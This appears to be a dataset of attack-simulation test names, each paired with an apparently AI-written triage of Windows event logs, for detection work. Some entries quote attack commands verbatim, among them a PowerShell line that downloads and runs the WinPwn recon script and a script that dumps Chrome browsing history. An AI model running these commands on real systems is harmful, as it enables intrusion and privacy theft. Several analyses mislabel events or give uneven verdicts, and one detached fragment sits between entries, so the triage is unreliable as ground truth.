- **Malware Scan**: Run comprehensive antivirus and anti-malware scans across the server and connected devices.
- **Audit**: Review administrative activities and user privileges for ensuring least privilege policies.
- **Patch and Update**: Ensure all systems are patched and updated against known vulnerabilities.

### Resolution:
**MALICIOUS** - The log entries exhibit behaviors and execution patterns consistent with malicious activities such as system reconnaissance and potential lateral movement using tools like `Snaffler.exe`."
Enumerate Active Directory Computers with ADSISearcher,"Upon analyzing the provided event logs, my assessment includes the following observations and findings:

### Summary and Analysis

1. **PowerShell Logs:**
   - The `PowerShell.exe` was executed with specific commands that interact with Active Directory Services Interface. The command line used was:
     ```
     powershell.exe & {([adsisearcher]""objectcategory=computer"").FindAll(); ([adsisearcher]""objectcategory=computer"").FindOne()}
     ```
   - The usage of ADSI in PowerShell can be legitimate for querying Active Directory machines but is also commonly exploited in enumeration and reconnaissance phases of attacks.

2. **Sysmon Logs:**
   - Numerous processes such as `WmiPrvSE.exe`, `wevtutil.exe`, `whoami.exe`, and `conhost.exe` were observed with the user `SERVER002\admin_test`.
   - Frequent use of `wevtutil.exe` is often associated with event log manipulation, which might be indicative of a cover-up attempt in malicious activities.
   - Execution of legitimate system binaries like `HOSTNAME.EXE` and `whoami.exe` under the admin context is not uncommon, but combined with the frequency of `wevtutil.exe`, it could hint toward enumeration or maintenance of persistence.

3. **Security Logs:**
   - There were repeated event ID `5379`, indicating failed credential reading operations for a MicrosoftAccount user. This might be related to misconfigurations or potential brute force attempts targeting linked Microsoft accounts.

4. **System and Application Logs:**
   - The logs show typical Windows update activities and Windows Defender operations running without any direct signs of being tampered with or disabled.

### Conclusion

Based on the complete analysis, there are a few activities that stand out as needing closer inspection:
- The combination of PowerShell scripts querying objects in Active Directory and frequent use of `wevtutil.exe` suggests potential enumeration and investigation of logs, which can be suspicious.
- Failed credential attempts might hint at unauthorized attempts to access the account.

### Recommendation

Given the above observations, the activities within the logs appear **SUSPICIOUS**. Although there's no direct indication of a full-scale compromise, the behavior observed could potentially be used in malicious activities. Additional investigation is required:

- Review access logs and confirm the legitimacy of the `admin_test` user activities.
- Verify whether the PowerShell and `wevtutil.exe` executions were scheduled, sanctioned, or explainable by known maintenance activities.
- Monitor for further unauthorized actions or credential access attempts on this host.

This situation warrants a detailed security review and, if necessary, forensic analysis to ensure that no backdoors are being set up or exploited by potential attackers."
WinPwn - GeneralRecon,"After a detailed analysis of the provided logs, the primary focus is on detecting any unusual or potentially malicious activity. Here are the observations:

1. **Process Execution and Command-Line Arguments**:
   - There are multiple executions of system utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `wevtutil.exe` under the user `SERVER002\admin_test`. However, these utilities are commonly used for legitimate administrative purposes and, in isolation, do not necessarily indicate malicious activity.
   - A PowerShell command executed by `SERVER002\admin_test` runs a script sourced from an external URL:  
     ```powershell
     ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), Generalrecon -consoleoutput -noninteractive}
     ```
     - This command uses `iex` (Invoke-Expression) to execute the script fetched from a GitHub repository, which is usually a red flag as it might be used to download and execute potentially harmful scripts. The use of an external PowerShell script titled ""WinPwn"" suggests potentially malicious intent.

2. **Privilege Levels**:
   - The commands and components were executed with `High` or `System` integrity levels, which implies that the user `admin_test` had administrative privileges. This is critical as any potentially malicious command run under such an integrity level poses a significant threat to the system.

3. **Microsoft Edge Update Activity**:
   - Several entries related to `MicrosoftEdgeUpdate.exe` and `Microsoft Edge Installer` show typical application update activities under `NT AUTHORITY\SYSTEM`, which are expected as part of regular system operations and updates.

4. **Security and Application Logs**:
   - There's no indication of Windows Defender or other security alerts within the specified logs that alert against potential threats. Windows Defender is reported to be active and in the `SECURITY_PRODUCT_STATE_ON` state.

5. **Other Observations**:
   - The regular use of utilities like `whoami.exe` and access to process details can be a part of legitimate use but, when paired with suspicious activities, they need careful observation.
   - The logs don't show a clear initial access point or lateral movement, but the concern over PowerShell scripts sourced externally remains.

**Assessment and Conclusion**:
- **SUSPICIOUS** - The concerns regarding the PowerShell scripts from an uncategorized external source and their execution in a high-integrity context merit further investigation. While this does not confirm definite malicious behavior, it suggests potentially insecure practices that could lead to abuse or unintended consequences.

**Guidance**:
- Verify the legitimacy of the GitHub repository and the intention behind its use by the user `admin_test` in case this is part of a sanctioned toolset.
- Conduct a full endpoint scan for any indicators of compromise that may have resulted from this script.
- Review the access logs and administrative actions of the user `admin_test` for any unusual behavior.
- If this use of PowerShell scripts is expected in your environment, consider implementing strict policies regarding script execution and monitor such activities closely.
"
Permission Groups Discovery PowerShell (Domain),"**Detailed Analysis of Windows Event Logs:**

Upon reviewing the provided Sysmon, Windows PowerShell, Application, System, and Security logs from a Windows host (Server002), here are the findings and analysis:

**Sysmon Log Analysis:**

- **Process Execution Analysis**:
  - Frequent execution of standard system utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` with a high integrity level by the user `SERVER002\admin_test`. This could be consistent with administrative activities such as system inquiries or configurations.
  - Notably, `powershell.exe` was executed with a command to retrieve Active Directory group memberships: `get-ADPrincipalGroupMembership $env:USERNAME`.
  - Regular updates and installations are evident by processes such as `MicrosoftEdgeUpdate.exe`, indicating normal software maintenance activities.

- **Parent-Child Process Relationships**:
  - Processes appear to exhibit legitimate parent-child relationships (e.g., `wsmprovhost.exe` is a typical parent for PowerShell and system processes in remote management scenarios).

**PowerShell Log Analysis:**

- The PowerShell logs indicate the execution of a script using the command to get AD group membership. This information is useful for understanding user permissions and roles within the system but doesn't inherently indicate malicious activity unless used sequentially with other suspicious activities.

**Application Log Analysis:**

- Logs indicate the stopping of the `edgeupdate` service, which can be part of normal system operations or software updates processes.

**System Log Analysis:**

- Regular time synchronization with `time.windows.com`, which is a common and benign activity for maintaining system time.

**Security Log Analysis:**

- The security logs lack entries, suggesting a need to verify logging settings or permissions for capturing relevant security events.

**Assessment of the Situation:**

- There is **no immediate evidence** of malicious activities. The logs predominantly reflect standard administrative and system update activities. Tools and commands executed are consistent with non-malicious behavior.

**Resolution: BENIGN**

- **Guidance on How to Proceed:**
  - Ensure that logging configurations for security events are correctly set up to capture all relevant activities for future analyses.
  - Regularly analyze logs to detect any deviations from typical patterns, especially when PowerShell scripts and high-integrity level processes are executed.
  - Conduct routine security audits and updates to ensure all software and systems are up-to-date with the latest patches.
- If any specific incidents or anomalies appear, a more granular investigation of associated timelines and user activities should be conducted to rule out hidden threats.

Overall, the reviewed logs suggest a benign set of activities reflective of typical system administration and updates, aligning with expected system behavior in a corporate environment."
Remote System Discovery - net group Domain Computers,"Upon reviewing the provided event logs, here is the detailed analysis of the various log entries, focusing on identifying any indicators of potential malicious activity:

### System Log
1. **Time Change Events**: Several events indicate that the system time was adjusted (""EventID"":""1"" and ""EventID"":""24""). This is not inherently suspicious, as it can be a result of legitimate time synchronization services. However, unauthorized changes can indicate an attempt to tamper with logs.

2. **Security Intelligence Update**: Events related to Microsoft Defender Antivirus updates are logged (EventID: 44, 43, 19). These events are normal and expected on a system that is regularly updating its antivirus signatures.

### Application Log
1. **Security Center**: Windows Defender is running and in an active state, as per the security center logs. This is a positive indicator of system protection.

### Sysmon Log
1. **Process Execution**: 
   - Execution of `whoami.exe` and `cmd.exe` commands are logged. While these tools are commonly used for legitimate administrative tasks, the use of `cmd.exe` with network-related commands such as `""cmd.exe"" /c net group ""Domain Computers"" /domain` can be a red flag if unexpected. This command queries the domain computers group, which may indicate an attempt to gather information on the network.
   - Several instances of `wevtutil.exe` are executed, which is used to manage Windows Event logs. This could be suspicious if it was used to clear logs or modify them to hide traces of malicious activity.
   - Execution of Windows system files and antivirus update binaries by `NT AUTHORITY\SYSTEM` shows legitimate system operations and updates.

2. **Privilege Logon**: Logs show events (EventID: 4624, 4672) indicating a logon with high privileges using NTLM authentication. The use of NTLM and the presence of high-level security privileges can be a point of concern if these actions are unexpected.

### Security Log
1. **Time Change by svchost.exe**: Security audit logs (EventID 4616) show `svchost.exe` made changes to the system time, which aligns with the System log findings.

2. **Sensitive Privileges Assigned**: The presence of multiple high-level privileges (SeSecurityPrivilege, SeBackupPrivilege, etc.) granted to a user (`admin_test`) might be alarming if such privileges are not usually assigned.

3. **Failed Credential Events**: Multiple EventID 5379 indicate failed attempts to access Microsoft and Windows Live services. Although common, repeated failures could indicate attempted unauthorized access.

### Windows PowerShell Log
- No entries were found to investigate. PowerShell often provides critical insights into potential script-based attacks or command execution.

### Assessment
Based on the logs, there are both benign and potentially suspicious activities observed:
- The execution of legitimate binaries (such as `wuauclt.exe`, `MpSigStub.exe`) by the system's authority appears benign.
- The log entries related to `wevtutil.exe` and the command working with domain groups could be suspicious if unexpected, especially if there are no known administrative tasks scheduled during the log timeframe.

### Resolution: SUSPICIOUS
The analysis suggests that while there are benign activities, the presence of potentially unwanted commands executed (`net group`) and the frequent use of `wevtutil.exe`, combined with the assignment of numerous high-level privileges, require further scrutiny. These may need investigation to ensure these activities align with legitimate administrative or maintenance tasks and to rule out any potential compromise or malicious intent.

### Guidance
- **Verify User Actions**: Confirm if the account `admin_test` was involved in expected activities during this period and validate any administrative tasks scheduled.
- **Audit Privilege Assignments**: Review the necessity and context of assigned privileges to `admin_test` and ensure they align with policy requirements.
- **Investigate Potential Anomalies**: Further investigate the execution of `wevtutil.exe` to confirm it wasn't used to tamper with logs.
- **Strengthen Monitoring**: Enhance monitoring of these activities using security tools to ensure that any out-of-policy actions are promptly identified and addressed."
Extract chrome Browsing History,"### Detailed Analysis:

#### General Observations:
The logs provided indicate standard system, security, and application activities. They are primarily focused on processes related to Microsoft Edge updates and standard Windows operations involving `svchost.exe`, `PowerShell.exe`, `wevtutil.exe`, and other system utilities. Below, I will analyze specific log entries that might stand out as potentially suspicious:

#### Sysmon Log Analysis:
1. **Microsoft Edge Update Activity:**
   - Several entries relate to `MicrosoftEdgeUpdate.exe` processes, which are legitimate update and registration activities for Microsoft Edge.
   - These processes are running under `NT AUTHORITY\SYSTEM`, which is standard for update processes, indicating high integrity and permission levels.

2. **PowerShell Command:**
   - A PowerShell script was executed:
     ```powershell
     $Username = (whoami).Split('\\')[1], $URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%%&amp;=]*)*?', $History = Get-Content -Path ""$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique, $History | Out-File -FilePath ""$Env:USERPROFILE\\Downloads\\chromebrowsinghistory.txt""
     ```
     - This script seeks to extract browsing history from Google Chrome and writes it to a file. Although this could indicate data gathering behavior commonly associated with malicious activity, the context is important. However, without more contextual data, it should at least be considered suspicious given its unusual nature.

3. **Command-line Utilities:**
   - Frequent invocations of command line utilities, such as `wevtutil.exe` and `conhost.exe`, by the `SERVER002\admin_test` account might warrant attention.
   - Use of `whoami.exe` under `admin_test` may indicate efforts at user reconnaissance.

4. **Repeated Process Executions:**
   - Rapid and repeated invocation of `wevtutil.exe` followed by `conhost.exe` suggests potential logging or event log manipulation attempts. While not immediately indicative of compromise, the frequency and rapid succession are unusual and worth further investigation.

#### Security and System Logs:
- **Time Changes:**
  - Minor time adjustments observed in `Security` and `Kernel-General` logs are typical for systems syncing with time servers, such as `time.windows.com`.
  - No explicit evidence of time tampering or backdating associated with compromise detected.

- **Service Executions:**
  - The log entries involving `svchost.exe` are standard and appear benign in the context provided.

#### PowerShell Logs:
- The PowerShell script activity appears tied to the Chrome history extraction noted in the Sysmon logs. While typical of some administrative tasks, it is suspicious due to its potential use in data exfiltration or privacy-compromising actions.

### Assessment:
- **Suspicious Activities:**
  - The use of PowerShell to parse and dump browser history in such a scripted manner within system logs.
  - Repetitive use of command-line utilities under administrative account within short time frames without obvious operational context.

### Resolution:
- **SUSPICIOUS** - The activities observed, particularly the use of PowerShell to access browser histories and repetitive command line executions, indicate a behavior pattern unusual for normal operations and warrant further investigation.
  
### Guidance for Next Steps:
1. **Investigate PowerShell Activity:**
   - Verify the source of the PowerShell script execution.
   - Assess whether the `admin_test` account or other entities utilized this operation legitimately.

2. **Monitor and Audit Admin Accounts:**
   - Implement monitoring to detect unusual behavior from `admin_test` and other administrative accounts.
   - Conduct a thorough review of recent changes or activities by these accounts.

3. **Broaden Investigation:**
   - Extend log analysis for network-related events for potential data exfiltration post-PowerShell activity.
   - Review any external connections or deployments that may have occurred around the log timestamp.

4. **Ensure System Security Hygiene:**
   - Ensure updates and security patches are current.
   - Strengthen network and endpoint protection configurations to track unexpected uses of command-line utilities and scripts.

This assessment highlights the potential for malicious activity without definitive evidence, thus necessitating further investigation."
AWS - EC2 Security Group Enumeration,"Upon reviewing the provided logs, let's conduct a detailed analysis focusing on signs of suspicious or anomalous behavior:

### Security Log: 
- The events here depict time change events (EventID 4616) and they show svchost.exe being involved in time updates. Such operations by svchost.exe are typical and expected as it hosts system services including time synchronization.

### Application Log:
- The events indicate normal operations of the Software Protection Platform service and Microsoft's Edge update service. The stopping of the edgeupdate service twice in a sequence could be normal behavior as part of a version update or maintenance.

### System Log:
- Events in the System log indicate normal time synchronization operations (EventID 1, 24) and the choice of a time source for the time service. No unusual privileges are evident.

### Sysmon Log:
- The Sysmon log reveals the execution of several utilities like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe`. These are common Windows utilities.
- The execution of `cmd.exe` with the command `aws ec2 describe-security-groups --profile default --output json` could be anomalous depending on whether AWS CLI use is expected on this server. It could indicate automation/orchestration activity, but without more context, it's not inherently malicious.
- Several instances of `MicrosoftEdgeUpdate.exe` are executed in typical paths indicating legitimate software update processes.

### Summary and Assessment:
- **Benign Activity:** Most event logs show typical system operations, including time management, svchost hosted services, and software updates, which display expected behaviors for a Windows environment.
- **Potentially Anomalous Activity:** The AWS CLI command run via `cmd.exe` could require closer examination if it is unexpected on this environment or if that particular user (`SERVER002\\admin_test`) isn't authorized or known for executing such commands.
  
### Recommendation:
To conclude:
- **Resolution: SUSPICIOUS** 
The logs primarily indicate benign activity. However, the command executed with `cmd.exe` related to AWS CLI could be looked into further by:
  - Verifying the necessity of AWS CLI on the server.
  - Checking for other instances and the context in which this command is executed.
  - Ensuring that `SERVER002\\admin_test` account activity aligns with standard operating procedures.

Further investigation is warranted to rule out any unauthorized or misconfigured activities especially related to external cloud service interactions."
Check computer location,"**Analysis of Logs:**

After thoroughly examining the provided logs from the Security, Sysmon, System, and Application logs, here's a detailed analysis:

### 1. **Security Logs:**
The two security log entries with EventID 4616 pertain to time change events by the ""svchost.exe"" process running as LOCAL SERVICE. These entries do not inherently indicate malicious activity, though time changes can sometimes accompany malicious actions.

### 2. **Sysmon Logs:**
- Multiple instances of ""wevtutil.exe"", ""conhost.exe"", ""whoami.exe"", and ""cmd.exe"" are seen executed by the user ""SERVER002\\admin_test"". These tools can be used for legitimate administrative purposes, and the use of ""whoami"" and registry queries (`cmd.exe` with the `reg query` command) isn't unusual for user activity in a technical or administrative role.
- **Microsoft Edge Update Activity:** Numerous logs are seen for ""MicrosoftEdgeUpdate.exe"", ""MicrosoftEdgeUpdateSetup.exe"", and related executables, all running under NT AUTHORITY\SYSTEM. The activity seems related to an update process, as indicated by command lines containing `/update`, `/regsvc`, `/regserver`, etc.
  
### 3. **System Logs:**
- Time synchronization events are logged with EventID 1 and 24. These are normal system operations related to time correction and are consistent with the time change events seen in the Security log.

### 4. **Application Logs:**
- The Application log shows entries related to the ""Software Protection Platform Service"" and ""edgeupdate"". The edgeupdate logs indicate the service stopped, which can be part of normal update routines.
  
### **Conclusion:**

The activity observed in the logs indicates normal system operations and software update processes. There is no distinct evidence of malware, ransomware, or a cyber threat. However, regular updates and configuration changes, like time synchronization, can sometimes be indicative of an attacker clearing tracks if viewed in conjunction with more suspicious activity elsewhere, but no such corroboration is found here.

### **Resolution: BENIGN**

No clear signs of malicious activity are apparent from the logs. All observed operations could be construed as legitimate, particularly the Microsoft Edge update process.

### **Recommendations & Guidance:**

1. **Monitoring:** Continue monitoring for unusual or out-of-pattern activities, and correlate with other logs and alerts.
2. **Update Review:** Always ensure that only the necessary updates are performed and that any additional software added during updates is verified as trustworthy.
3. **User Activity:** Though no malicious activities are identified, it's prudent to occasionally review admin actions for legitimacy.

In case the activities were unexplained, below recommendations would hold:
4. **Further Investigation:** If there are concerns about specific user activities or process executions, deeper auditing and verification of compliance with company policies are advised.
5. **Threat Intelligence:** Consult up-to-date cybersecurity intelligence to ensure no new threat vectors align with these activities.

Conclude with confidence, unless corroborating evidence suggests otherwise."

- Verifying the legitimacy of scripts executed through PowerShell.
- Reviewing user access permissions and intended activities around the times these processes were executed.
- Monitoring for any further abnormal activity associated with the `admin_test` user or from the `Server002` host.
- Evaluating if any alterations or deletions occurred in event logs facilitated by `wevtutil.exe`.

After these actions, re-assess the situation for potential escalation or closure based on findings."
Enumerate Active Directory Groups with Get-AdGroup,"After conducting a thorough analysis of the provided Windows event logs, the following findings and observations were made:

### Summary of Findings:

1. **PowerShell Activity:**
   - The logs show the execution of the following PowerShell command:
     ```
     powershell.exe & {Get-AdGroup -Filter *}
     ```
   - This command is benign in nature and is typically used for retrieving a list of Active Directory groups. There is no indication from the logs that any harmful actions were being carried out with PowerShell.

2. **Sysmon Logs:**
   - Multiple entries are showing legitimate operations involving system files like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and PowerShell. These processes are normal system executables.
   - The commands executed and the context (identifying logged-on users, process GUIDs) appear typical for administrative or maintenance purposes.

3. **Edge Update Activity:**
   - Frequent operations related to `MicrosoftEdgeUpdate.exe` are observed. These seem to be legitimate updates by the system for Microsoft Edge, conducted under the `NT AUTHORITY\SYSTEM` context, which is standard for system updates.
   - The presence of update setup and registration activities, registered as scheduled tasks or services, do not raise immediate suspicion.

4. **Log Time Adjustment:**
   - There is an occurrence of time change adjustment in both the Security and System logs (`EventID 4616`), which highlights a change in the system time. This appears normal as there are no irregularities, manipulation, or patterns suggesting malicious time manipulation, especially since this adjustment reverted back within milliseconds.

5. **Security Log Entries:**
   - User `admin_test` appears to perform regular administrative tasks with relevant privileges. There is no excessive or unauthorized privilege assignment beyond what might be expected for an administrator.
   - Logon events (`EventID 4624`) and privilege use (`EventID 4672`) associated with `admin_test` indicate a typical administrative access pattern.

### Conclusion:

Based on the logs provided, there is no clear evidence of malicious activity or indicators of compromise (IOC). The activities recorded are consistent with expected system and administrative operations.

### Resolution:

The logs can be classified as **BENIGN**. They capture routine system processes and scheduled maintenance activities without demonstrating any anomalous, obfuscated, or unexplained behavior indicative of a compromise.

### Recommendations:

- **Continuous Monitoring:** Continue regular log monitoring and auditing to catch potential anomalies early.
- **Review Administrative Tools Use:** Ensure that the usage of powerful tools like PowerShell is controlled and logged effectively.
- **Update Scrutiny:** It is always recommended to regularly review the scheduling and execution of update procedures to ensure they comply with organizational policies.

No further investigation is required unless additional context, such as alerts or incidents, emerges that could alter the current assessment."
Remote Desktop Services Discovery via PowerShell,"In the analysis of the given Windows event logs, we need to focus on identifying any activities that may suggest malicious actions or security concerns. The logs primarily include records from the System, Sysmon, Windows PowerShell, Security, and Application channels. Let's break down each log and look for potential indicators of compromise:

### Suspicious Behavior Analysis:

1. **System Log:**
   - There are entries related to time adjustments made by the `svchost.exe` process, which is typical for time synchronization. Seeing the Time Service and Kernel-General entries indicate this activity. This might raise concerns if occurring frequently or if discrepancies exist, but in this context, it appears routine.

2. **Sysmon Log:**
   - `wevtutil.exe` and `conhost.exe` processes appear repeatedly and in quick succession, controlled by the user `SERVER002\admin_test`. `wevtutil.exe` is used for managing event logs, which can be normal for administrative tasks but can also indicate log tampering if abused.
   - The execution of `powershell.exe` with the command to get the status of Remote Desktop Services is noticeable. While running PowerShell scripts is common for administrators, specific attention to Remote Desktop Services might prevail if there is an interest in remote connections.
   - The frequent execution of processes, including `hostname.exe`, `whoami.exe`, and `MicrosoftEdge_X64` installation activities, can be normal but sometimes indicative of enumeration or administrative setup tasks.

3. **Windows PowerShell Log:**
   - The PowerShell log aligns with Sysmon's evidence of a command used to check Remote Desktop Services. This type of activity can be legitimate, but when it's combined with administrative actions, it's worth monitoring more closely.

4. **Security Log:**
   - Event IDs 4624 and 4672 suggest successful logins and special privileges being assigned to the `admin_test` user. The presence of multiple privilege settings including `SeDebugPrivilege` is notable, as it can allow for extensive, potentially harmful actions across the system. 
   - NTLM authentication is used, with an IP routinely engaging the server. This could raise alarm if from an unexpected source, but this is not determined from the log.

5. **Application Log:**
   - No significant indicators from the one application log entry, which records routine activity of the Software Protection Platform.

### Assessment:

- **BENIGN**: Routine administrative and system activities can explain most log entries without raising immediate red flags regarding security compromises.
- **SUSPICIOUS**: The focus on Remote Desktop Services, combined with the elevated privileges of the `admin_test` user and the use of `wevtutil.exe`, warrants closer attention. If this set of activities isn't accounted for by a known administrative action, it could indicate possible preparation or information gathering for unauthorized access.

### Resolution:

Given the specific scenario observed in these logs, the suggested resolution would be **SUSPICIOUS**. The activities necessitate further verification, especially the log review and privilege assignments under the `admin_test` account. Recommended actions include:
- Confirm if the `admin_test` activities match scheduled maintenance or administrative tasks.
- Perform an internal review or audit trail investigation to ensure the actions align with expected behavior and there are no unexplained external access attempts.
- Monitor logs for any additional activities that could suggest misuse or confirmation of malicious intent.

This analysis helps provide a basis for determining if these logs are irregular or expected for this host's typical usage patterns."
Port Scan using python,"Upon analyzing the provided Windows event logs across various categories, here's the assessment of the log entries:

### Analysis:

1. **PowerShell Log:**
   - A PowerShell process is executed with the `HostApplication` running a script that performs the following actions:
     - Creates a directory structure under the Temp path.
     - Downloads the Python installer (python-3.10.4-amd64.exe) from a legitimate source (python.org).
     - Executes the Python installer silently using specific command-line arguments.
     - Subsequently runs a Python script located within the Temp directory with a specified IP address as an argument.
   - Although downloading and installing Python from an official website is not inherently malicious, the execution context and the directory could be indicative of an attacker attempting to conduct post-exploitation activities.

2. **Security Log:**
   - Multiple Event ID 4798 (enumeration of local group's membership) are logged within a short timespan, originating from CompatTelRunner.exe, indicating potential enumeration of user accounts/groups. While CompatTelRunner.exe is a legitimate Microsoft process, this kind of usage warrants closer inspection for abuse or misuse.

3. **Sysmon Log:**
   - Observations of processes linked to Python and PowerShell execution from Temp directories.
   - Usage of utility tools like `hostname.exe`, `whoami.exe`, indicating possible recon activities.
   - Execution of Sysmon logs shows evidence of script-based execution possibly linked to administrative or elevated user rights (e.g., admin_test).

4. **System and Application Logs:**
   - Routine Windows Update activities, as well as standard system operations, are logged. These activities don't directly imply suspicious behavior.

### Conclusion:

Based on the observed log patterns, particularly the network connection-oriented execution of scripts, admin-level operations, enumeration of system accounts/groups, and activity in sensitive directories:

- **Resolution: SUSPICIOUS**

### Recommendations:

1. **Further Investigation:**
   - Inspect the origin and purpose of the PowerShell scripts and Python download/install events. Verify the intent of these operations with server administrators.
   - Conduct a deeper analysis of the `admin_test` user activities to ensure these actions were authorized.
   - Verify with the system administrators or relevant business units about the necessity of the scripts observed.

2. **Immediate Actions:**
   - Review and, if necessary, limit the privileges for the accounts used in these operations until authenticity and goals of scripts are verified.
   - Consider network restrictions for servers to prevent unauthorized/download actions.

3. **Potential Blocking:**
   - If verified unauthorized, blocking the involved IPs, scripts, or network access could prevent further unauthorized activities.

Further steps should involve coordinating with IT and administrative personnel to validate the legitimacy of the observed actions and apply measures for mitigating potential risks if they prove to be unwarranted."
Windows Internal Packet Capture,"After a thorough examination of the provided Windows event logs, here's a detailed analysis focusing on potential indicators of malicious activity or compromise:

### Analysis of Logs

1. **Application Log Observation**:
   - The Application log is limited and only contains entries related to the Software Protection Platform Service, indicating routine operations with a timestamp consistent with the other logs.

2. **Sysmon Event Analysis**:
   - The logs show multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate system utility used to query event logs, and `conhost.exe` is a console window host process. Although these processes are legitimate, frequent rapid invocations could potentially raise suspicion, particularly if not justified by administrative tasks.
   - Particularly noteworthy is the execution sequence involving `cmd.exe` with the command line: `""cmd.exe"" /c netsh trace start capture=yes tracefile=%%temp%%\\trace.etl maxsize=10`. This command sequence starts a network trace using `netsh`, which might be part of a legitimate troubleshooting process if undertaken by an administrator. However, without context, such actions could also be indicative of a user monitoring network traffic illicitly.
   - The Sysmon events describe hosts for services (`svchost.exe`) and update tasks (`MicrosoftEdgeUpdate.exe`), seemingly routine and without further evidence of malicious configurations.

3. **System Log Review**:
   - The system log indicates a time change, which in a security context, especially if unplanned, can mask malicious activity. The time change appears manual as denoted by the changes in records, but no direct malicious implications can be conclusively drawn without additional context regarding administrative reasons.

4. **Security Log Observations**:
   - A security log entry described elevated privileges for the SYSTEM user, listing a variety of privileges. This could indicate high-level administrative actions being taken, which may be normal for system processes but requires verification that it aligns with expected administrative routines.

### Assessment and Recommendation

**Assessment**:
- The logs primarily show routine system processes and actions carried out by a user with administrative privileges. The frequent execution of processes such as `wevtutil.exe`, and network traces, alongside the time change without clear explicit justification provided in the logs, could warrant a deeper dive, but by themselves, they do not definitively point to malicious activities.

**Threats/Risks Identified**:
- Potential misuse of administrative privileges for unauthorized monitoring (e.g., network tracing).
- Time manipulation could potentially mask malicious activities if not part of maintenance or troubleshooting.

**Guidance on How to Proceed**:
- **Verification Needed**: Confirm with the system administrators whether there is an operational reason for the timestamp changes and the network packet tracing.
- **User Activity Review**: Review any corresponding access controls or records for `admin_test` to verify legitimate use.
- **Monitor for Similar Activities**: Implement enhanced monitoring for unusual patterns or unauthorized access related to the processes mentioned, especially if patterns of execution continue.

**Resolution**: **SUSPICIOUS**

The detected events and behaviors suggest some potentially unusual activity that doesn't immediately indicate a compromise but does require further investigation to rule out misuse or unauthorized actions."
List Process Main Windows - C# .NET,"Upon thorough analysis of the provided Windows event logs, here are the findings:

### Security Log Analysis:
- **Event ID 5379**: This event signifies Account Logon operations related to credential validation. The repeated appearances of failed credential validation events for Microsoft and Windows Live accounts (with ReturnCode 3221226021) using the machine’s built-in account (SERVER002$) indicate potentially erroneous or misconfigured attempts at credential validation, possibly while trying to access online accounts or services. However, these events themselves do not explicitly indicate malicious behavior, as they could be the result of attempted configurations or automatic service checking that has failed.

### Sysmon Log Analysis:
- **Windows PowerShell (powershell.exe)**, **Console Window Host (conhost.exe)**, and **Event Utility Command Line Utility (wevtutil.exe)** are seen executing under the account ""SERVER002\admin_test."" Frequent use of PowerShell, especially in a burst of events, can be suspicious if the actions performed are not typical administrative tasks or involve unusual scripting. 
- **Compilation of an Executable via csc.exe**: The command line shows that source code (“data.cs”) was compiled into an “data.exe” file within the Temp directory. The use of the C# compiler (csc.exe), followed by immediate execution of the resulting executable (data.exe), and placement in a temporary directory is potentially suspicious as this is a tactic commonly used for executing additional code or malware without leaving an obvious footprint directly on disk.
  
- **Processes like whoami.exe and hostname.exe** are generally benign. However, they might have been executed after the “data.exe” executable to verify user permissions or host information, which can align with post-exploitation activities.

- **Use of wevtutil.exe again** to export logs could indicate an attempt to access, exfiltrate, or manipulate event logs, potentially aiming to cover tracks.

### System Log Analysis:
- The logs here primarily reflect Windows Update activities, which appear to be a routine update for Microsoft Defender Antivirus. There is no indication here of unusual activity.
  
### Overall Assessment:
The analysis of log entries shows:
- Execution of a compiled executable in a non-standard location.
- Execution of wevtutil.exe concurrently with PowerShell and other administrative utilities in quick succession.
- There is evidence of administrative and potentially automated script actions. While these actions can be legitimate if performed by an administrator, they can also be indicative of an attacker using built-in Windows tools to conduct lateral movement or maintain persistency.

### Final Resolution:
- **SUSPICIOUS**: The logs involve activities such as script execution and on-the-fly compilation and execution of source code, combined with manipulation of event logs, which are behaviors that warrant further investigation. These detections require additional context, such as the verification of administrator activities and any corresponding alerts from endpoint detection systems, to confirm whether this is benign scripting or part of a malicious operation. 

**Guidance on How to Proceed:**
1. **Verify Administrative Actions**: Confirm the script and compilation actions with the responsible administrator to check if these are part of any routine operations or known software deployments.
2. **Further Investigation**: Conduct a deeper investigation into the purpose and origin of the data.cs file and data.exe to determine whether they contain any malicious code.
3. **Check Endpoint Protection Alerts**: Cross-reference these logs with alerts from your endpoint protection systems to see if additional alarms or warnings have been triggered associated with this temporal window.
4. **Network Monitoring and Threat Intelligence**: Look for any suspicious outbound connections from the host or communication with known malicious IP addresses.
5. **Consider Quarantine**: If evidence suggests that these activities are unauthorized or potentially harmful, consider isolating the host for further forensic analysis."
Powershell enumerate domains and forests,"Upon thorough analysis of the given logs, here are the observations:

1. **Event Log 4624 and 4672 (Security Logs)**:
   - These logs show successful logon events for the SYSTEM user account and special privileges assigned to it. This might be normal under certain conditions where services need to interact with SYSTEM level permissions.

2. **Event Log 4798 (Security Logs)**:
   - Multiple queries executed against various user accounts including Administrator, admin_test, Guest, and others. The process name `C:\\Windows\\System32\\taskhostw.exe` suggests possibly a scheduled task or service rundown. However, curiosity arises from the frequent querying of user accounts.

3. **Sysmon Logs**:
   - Repeated execution of `powershell.exe` and `conhost.exe` by the `SERVER002\admin_test` user. The PowerShell command imports a module named ""PowerView.ps1"" from a temporary directory, often associated with penetration testing and active directory enumeration.
   - Further exploration of directories and access to other potentially sensitive Active Directory entries via PowerShell commands are evidence of exploring the network, which is unusual if the user is not authorized for such scans.
   - Execution of `wevtutil.exe` also indicates fetching event logs from the system, which should be limited to certain roles.

4. **Windows PowerShell Logs**:
   - Confirmation of PowerShell activity loading the ""PowerView.ps1"" script and gathering data related to network/domain trusts and group memberships. This can indicate reconnaissance activity.

5. **Application Logs and Other Events**:
   - Normal operation logs for Windows Defender and system processes. These do not directly indicate malicious activity but should be viewed as part of a larger context.

**Conclusion**:
